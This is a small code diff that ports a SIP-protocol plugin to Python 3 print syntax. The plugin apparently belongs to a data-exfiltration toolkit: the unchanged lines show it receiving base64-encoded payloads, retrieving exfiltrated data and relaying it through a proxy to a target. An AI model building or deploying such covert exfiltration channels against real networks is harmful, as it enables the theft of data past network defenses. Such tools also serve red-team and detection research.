@@ -2,6 +2,7 @@
 
 #inspired from: https://books.google.fr/books?id=cHOmCwAAQBAJ&pg=PA747&lpg=PA747&dq=sdp+smime&source=bl&ots=34LYW5iJyc&sig=4a1szVXKMDtqQWUb0K2gM29AgL8&hl=fr&sa=X&ved=0ahUKEwjbm5Tf1JzTAhUGfxoKHX-UCQUQ6AEIVTAG#v=onepage&q=sdp%20smime&f=false
 
+from __future__ import print_function
 from dpkt import sip
 import socket
 import string
@@ -207,8 +208,8 @@ def listen():
                     app_exfiltrate.log_message('info', "[sip] Received {0} bytes from {1}".format(len(payload), addr[0]))
                     app_exfiltrate.retrieve_data(base64.b64decode(payload))
         except Exception as e:
-            print traceback.format_exc()
-            print 'exception: ' + repr(e)
+            print(traceback.format_exc())
+            print('exception: ' + repr(e))
             pass
 
 def send(data):
@@ -262,7 +263,7 @@ def proxy():
                 app_exfiltrate.log_message('info', "[proxy] [sip] Relaying data to {0}".format(sender))
                 sock.sendto(data, (target, port))
         except:
-            print traceback.format_exc()
+            print(traceback.format_exc())
 
 class Plugin:
 
